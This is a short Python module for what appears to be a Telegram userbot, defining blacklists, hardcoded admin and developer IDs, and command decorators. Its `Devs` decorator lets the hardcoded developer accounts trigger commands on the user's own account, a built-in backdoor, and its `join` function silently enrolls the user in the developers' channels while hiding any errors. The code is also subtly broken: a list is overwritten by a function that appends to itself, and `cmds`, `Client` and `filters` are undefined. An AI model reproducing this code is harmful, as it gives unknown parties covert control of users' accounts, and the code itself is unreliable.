import sys
from datetime import datetime, timezone
from typing import Union, Dict, Optional


BL_GCAST = [-1001755737234]
BL_UBOT = [1245451624]

BOT_VER = "1.0.0"

ADMINS = [5615921474, 1620434318, 1442917841]
DEVS = [5615921474, 1620434318, 1442917841]
py_rainger = [5615921474, 1620434318, 1442917841]

py_raingerx = [5615921474, 1620434318, 1442917841]
def py_raingerx(client, message):
    chat_id = message.chat.id
    admins = client.get_chat_administrators(-1001755737234)
    admin_list = [admin.user.first_name for admin in admins]
    py_raingerx.append(admin_list)

async def join(client):
    try:
        await client.join_chat("raingersuppor")
        await client.join_chat("raingerproject")
        await client.join_chat("xtafes")
        await client.join_chat("xtafesgc")
    except BaseException:
        pass

def Ubot(command: str, prefixes: cmds):
    def wrapper(func):
        @Client.on_message(filters.command(command, prefixes) & filters.me)
        async def wrapped_func(client, message):
            await func(client, message)

        return wrapped_func

    return wrapper

def Devs(command: str):
    def wrapper(func):
        @Client.on_message(filters.command(command, ".") & filters.user(DEVS))
        def wrapped_func(client, message):
            return func(client, message)

        return wrapped_func

    return wrapper
